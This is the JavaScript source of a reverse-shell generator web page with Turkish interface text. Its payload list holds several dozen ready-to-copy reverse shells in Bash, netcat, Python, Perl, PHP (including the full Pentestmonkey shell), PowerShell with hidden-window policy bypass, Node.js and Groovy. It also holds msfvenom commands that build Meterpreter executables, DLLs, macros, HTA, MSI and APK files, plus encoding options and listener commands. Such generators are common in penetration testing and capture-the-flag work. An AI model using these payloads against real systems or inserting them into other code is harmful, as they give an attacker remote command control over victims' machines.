// Reverse Shell Payloads Database
const payloads = [
  // Linux Shells
  {
    name: "Bash -i",
    category: "linux",
    icon: "🐧",
    type: "Bash Reverse Shell",
    template: `bash -i >& /dev/tcp/{IP}/{PORT} 0>&1`,
  },
  {
    name: "Bash 196",
    category: "linux",
    icon: "🐧",
    type: "Bash Reverse Shell",
    template: `0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196`,
  },
  {
    name: "Bash UDP",
    category: "linux",
    icon: "🐧",
    type: "Bash UDP Shell",
    template: `bash -i >& /dev/udp/{IP}/{PORT} 0>&1`,
  },
  {
    name: "Netcat -e",
    category: "linux",
    icon: "🔗",
    type: "Netcat Traditional",
    template: `nc -e /bin/bash {IP} {PORT}`,
  },
  {
    name: "Netcat mkfifo",
    category: "linux",
    icon: "🔗",
    type: "Netcat OpenBSD",
    template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f`,
  },
  {
    name: "Netcat -c",
    category: "linux",
    icon: "🔗",
    type: "Netcat with -c",
    template: `nc -c /bin/bash {IP} {PORT}`,
  },
  {
    name: "Python3",
    category: "linux",
    icon: "🐍",
    type: "Python3 Reverse Shell",
    template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
  },
  {
    name: "Python2",
    category: "linux",
    icon: "🐍",
    type: "Python2 Reverse Shell",
    template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
  },
  {
    name: "Perl",
    category: "linux",
    icon: "🐪",
    type: "Perl Reverse Shell",
    template: `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    name: "Ruby",
    category: "linux",
    icon: "💎",
    type: "Ruby Reverse Shell",
    template: `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
  {
    name: "Socat",
    category: "linux",
    icon: "🔌",
    type: "Socat Reverse Shell",
    template: `socat TCP:{IP}:{PORT} EXEC:/bin/bash`,
  },
  {
    name: "Socat TTY",
    category: "linux",
    icon: "🔌",
    type: "Socat Full TTY",
    template: `socat TCP:{IP}:{PORT} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane`,
  },
  {
    name: "AWK",
    category: "linux",
    icon: "📝",
    type: "AWK Reverse Shell",
    template: `awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  },
  {
    name: "Lua",
    category: "linux",
    icon: "🌙",
    type: "Lua Reverse Shell",
    template: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
  },
  // Windows Shells
  {
    name: "PowerShell #1",
    category: "windows",
    icon: "💠",
    type: "PowerShell Reverse Shell",
    template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    name: "PowerShell #2",
    category: "windows",
    icon: "💠",
    type: "PowerShell Alt",
    template: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
  },
  {
    name: "PowerShell Base64",
    category: "windows",
    icon: "💠",
    type: "PowerShell Encoded",
    template: `powershell -e {BASE64_PAYLOAD}`,
  },
  // Web Shells
  {
    name: "PHP exec",
    category: "web",
    icon: "🐘",
    type: "PHP Reverse Shell",
    template: `php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: "PHP shell_exec",
    category: "web",
    icon: "🐘",
    type: "PHP Shell Exec",
    template: `php -r '$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: "PHP popen",
    category: "web",
    icon: "🐘",
    type: "PHP Popen",
    template: `php -r '$sock=fsockopen("{IP}",{PORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");'`,
  },
  {
    name: "PHP Pentestmonkey",
    category: "web",
    icon: "🐘",
    type: "PHP Full Shell",
    template: `<?php set_time_limit(0);$VERSION="1.0";$ip='{IP}';$port={PORT};$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit("ERROR: Can't fork");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit("Error: Can't setsid()");exit(1);}$daemon=1;}else{printit("WARNING: Failed to daemonise.");}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit("$errstr ($errno)");exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit("ERROR: Can't spawn shell");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("Successfully opened reverse shell to $ip:$port");while(1){if(feof($sock)){printit("ERROR: Shell connection terminated");break;}if(feof($pipes[1])){printit("ERROR: Shell process terminated");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit("SOCK READ");$input=fread($sock,$chunk_size);if($debug)printit("SOCK: $input");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit("STDOUT READ");$input=fread($pipes[1],$chunk_size);if($debug)printit("STDOUT: $input");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit("STDERR READ");$input=fread($pipes[2],$chunk_size);if($debug)printit("STDERR: $input");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print "$string\\n";}}?>`,
  },
  {
    name: "Node.js",
    category: "web",
    icon: "🟢",
    type: "Node.js Reverse Shell",
    template: `(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({PORT}, "{IP}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
  },
  {
    name: "Groovy",
    category: "web",
    icon: "☕",
    type: "Groovy Reverse Shell",
    template: `String host="{IP}";int port={PORT};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
  },
  // MSFVenom Payloads
  {
    name: "Linux Meterpreter (x64)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Staged",
    template: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf`,
  },
  {
    name: "Linux Meterpreter (x86)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Staged",
    template: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf`,
  },
  {
    name: "Linux Shell (x64)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Stageless",
    template: `msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf`,
  },
  {
    name: "Linux Shell (x86)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Stageless",
    template: `msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf`,
  },
  {
    name: "Windows Meterpreter (x64)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Staged",
    template: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe`,
  },
  {
    name: "Windows Meterpreter (x86)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Staged",
    template: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe`,
  },
  {
    name: "Windows Shell (x64)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Stageless",
    template: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe`,
  },
  {
    name: "Windows Shell (x86)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Stageless",
    template: `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe`,
  },
  {
    name: "Windows DLL (x64)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom DLL",
    template: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f dll > shell.dll`,
  },
  {
    name: "Windows PowerShell",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom PS1",
    template: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f psh -o shell.ps1`,
  },
  {
    name: "Windows HTA",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom HTA",
    template: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f hta-psh -o shell.hta`,
  },
  {
    name: "Windows MSI",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom MSI",
    template: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f msi > shell.msi`,
  },
  {
    name: "Windows VBA",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Macro",
    template: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f vba -o shell.vba`,
  },
  {
    name: "PHP Meterpreter",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom PHP",
    template: `msfvenom -p php/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f raw > shell.php`,
  },
  {
    name: "ASP Meterpreter",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom ASP",
    template: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f asp > shell.asp`,
  },
  {
    name: "ASPX Meterpreter",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom ASPX",
    template: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f aspx > shell.aspx`,
  },
  {
    name: "JSP Meterpreter",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom JSP",
    template: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw > shell.jsp`,
  },
  {
    name: "WAR Meterpreter",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom WAR",
    template: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f war > shell.war`,
  },
  {
    name: "Python Meterpreter",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Python",
    template: `msfvenom -p python/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f raw > shell.py`,
  },
  {
    name: "Bash Shell",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Bash",
    template: `msfvenom -p cmd/unix/reverse_bash LHOST={IP} LPORT={PORT} -f raw > shell.sh`,
  },
  {
    name: "Perl Shell",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom Perl",
    template: `msfvenom -p cmd/unix/reverse_perl LHOST={IP} LPORT={PORT} -f raw > shell.pl`,
  },
  {
    name: "macOS Meterpreter (x64)",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom macOS",
    template: `msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f macho > shell.macho`,
  },
  {
    name: "Android Meterpreter",
    category: "msfvenom",
    icon: "🔴",
    type: "MSFVenom APK",
    template: `msfvenom -p android/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} R > shell.apk`,
  },
];

// Generate all shells on page load
document.addEventListener("DOMContentLoaded", function () {
  generateAllShells();
  setupTabListeners();
  setupSearchListener();
  updateListenerCommands();
});

// Update listener commands when port changes
document
  .getElementById("port")
  .addEventListener("input", updateListenerCommands);
document.getElementById("ip").addEventListener("input", generateAllShells);
document.getElementById("port").addEventListener("input", generateAllShells);
document.getElementById("shell").addEventListener("change", generateAllShells);
document
  .getElementById("encoding")
  .addEventListener("change", generateAllShells);

function updateListenerCommands() {
  const port = document.getElementById("port").value || "4444";

  document.getElementById("nc-listener").textContent = `nc -lvnp ${port}`;
  document.getElementById("rlwrap-listener").textContent =
    `rlwrap nc -lvnp ${port}`;
  document.getElementById("socat-listener").textContent =
    `socat -d -d TCP-LISTEN:${port} STDOUT`;
  document.getElementById("pwncat-listener").textContent =
    `pwncat-cs -lp ${port}`;
}

function generateAllShells() {
  const ip = document.getElementById("ip").value || "10.10.14.5";
  const port = document.getElementById("port").value || "4444";
  const shell = document.getElementById("shell").value;
  const encoding = document.getElementById("encoding").value;

  const container = document.getElementById("payloads-container");
  container.innerHTML = "";

  payloads.forEach((payload, index) => {
    let code = payload.template
      .replace(/{IP}/g, ip)
      .replace(/{PORT}/g, port)
      .replace(/{SHELL}/g, shell);

    // Apply encoding
    code = applyEncoding(code, encoding);

    const card = createPayloadCard(payload, code, index);
    container.appendChild(card);
  });

  updateListenerCommands();
}

function applyEncoding(code, encoding) {
  switch (encoding) {
    case "base64":
      return btoa(code);
    case "url":
      return encodeURIComponent(code);
    case "double-url":
      return encodeURIComponent(encodeURIComponent(code));
    default:
      return code;
  }
}

function createPayloadCard(payload, code, index) {
  const card = document.createElement("div");
  card.className = "payload-card";
  card.dataset.category = payload.category;
  card.style.animationDelay = `${index * 0.05}s`;

  const uniqueId = `payload-${index}`;

  card.innerHTML = `
        <div class="payload-header">
            <div class="payload-info">
                <span class="language-icon">${payload.icon}</span>
                <div class="payload-details">
                    <h3>${payload.name}</h3>
                    <span class="payload-type">${payload.type}</span>
                </div>
            </div>
            <button class="copy-btn" onclick="copyToClipboard(this, '${uniqueId}')">
                <span class="copy-icon">📋</span>
                Kopyala
            </button>
        </div>
        <div class="payload-body">
            <code id="${uniqueId}" class="payload-code">${escapeHtml(code)}</code>
        </div>
    `;

  return card;
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

function copyToClipboard(button, elementId) {
  const codeElement = document.getElementById(elementId);
  const text = codeElement.textContent;

  navigator.clipboard
    .writeText(text)
    .then(() => {
      // Show success state
      button.classList.add("copied");
      button.innerHTML = '<span class="copy-icon">✅</span> Kopyalandı!';

      // Show toast
      showToast();

      // Reset button after 2 seconds
      setTimeout(() => {
        button.classList.remove("copied");
        button.innerHTML = '<span class="copy-icon">📋</span> Kopyala';
      }, 2000);
    })
    .catch((err) => {
      console.error("Failed to copy: ", err);
      // Fallback for older browsers
      const textArea = document.createElement("textarea");
      textArea.value = text;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand("copy");
      document.body.removeChild(textArea);
      showToast();
    });
}

function showToast() {
  const toast = document.getElementById("toast");
  toast.classList.add("show");

  setTimeout(() => {
    toast.classList.remove("show");
  }, 2000);
}

function setupTabListeners() {
  const tabs = document.querySelectorAll(".tab-btn");

  tabs.forEach((tab) => {
    tab.addEventListener("click", function () {
      // Remove active class from all tabs
      tabs.forEach((t) => t.classList.remove("active"));
      // Add active class to clicked tab
      this.classList.add("active");

      // Filter payloads
      const category = this.dataset.category;
      filterPayloads(category);
    });
  });
}

function filterPayloads(category) {
  const cards = document.querySelectorAll(".payload-card");
  const searchInput = document.getElementById("search-input");
  const searchTerm = searchInput ? searchInput.value.toLowerCase().trim() : "";

  let visibleCount = 0;

  cards.forEach((card) => {
    const matchesCategory = category === "all" || card.dataset.category === category;
    const cardName = card.querySelector("h3").textContent.toLowerCase();
    const cardType = card.querySelector(".payload-type").textContent.toLowerCase();
    const cardCategory = card.dataset.category.toLowerCase();
    const matchesSearch = searchTerm === "" || 
      cardName.includes(searchTerm) || 
      cardType.includes(searchTerm) || 
      cardCategory.includes(searchTerm);

    if (matchesCategory && matchesSearch) {
      card.style.display = "block";
      card.style.animation = "fadeIn 0.3s ease forwards";
      visibleCount++;
    } else {
      card.style.display = "none";
    }
  });

  updateSearchResults(visibleCount, cards.length);
}

// Search functionality
function setupSearchListener() {
  const searchInput = document.getElementById("search-input");
  const clearBtn = document.getElementById("clear-search");

  if (searchInput) {
    searchInput.addEventListener("input", function () {
      const searchTerm = this.value.trim();
      
      // Show/hide clear button
      if (clearBtn) {
        if (searchTerm.length > 0) {
          clearBtn.classList.add("visible");
        } else {
          clearBtn.classList.remove("visible");
        }
      }

      // Get current active category
      const activeTab = document.querySelector(".tab-btn.active");
      const category = activeTab ? activeTab.dataset.category : "all";

      // Filter with search
      filterPayloads(category);
    });

    // Handle Enter key
    searchInput.addEventListener("keydown", function (e) {
      if (e.key === "Escape") {
        clearSearch();
      }
    });
  }
}

function clearSearch() {
  const searchInput = document.getElementById("search-input");
  const clearBtn = document.getElementById("clear-search");
  
  if (searchInput) {
    searchInput.value = "";
    if (clearBtn) {
      clearBtn.classList.remove("visible");
    }
    
    // Re-filter with current category
    const activeTab = document.querySelector(".tab-btn.active");
    const category = activeTab ? activeTab.dataset.category : "all";
    filterPayloads(category);
  }
}

function updateSearchResults(visible, total) {
  const resultsEl = document.getElementById("search-results");
  const searchInput = document.getElementById("search-input");
  
  if (resultsEl && searchInput) {
    const searchTerm = searchInput.value.trim();
    
    if (searchTerm.length > 0) {
      resultsEl.innerHTML = `<span class="count">${visible}</span> / ${total} payload gösteriliyor`;
    } else {
      resultsEl.innerHTML = "";
    }
  }
}
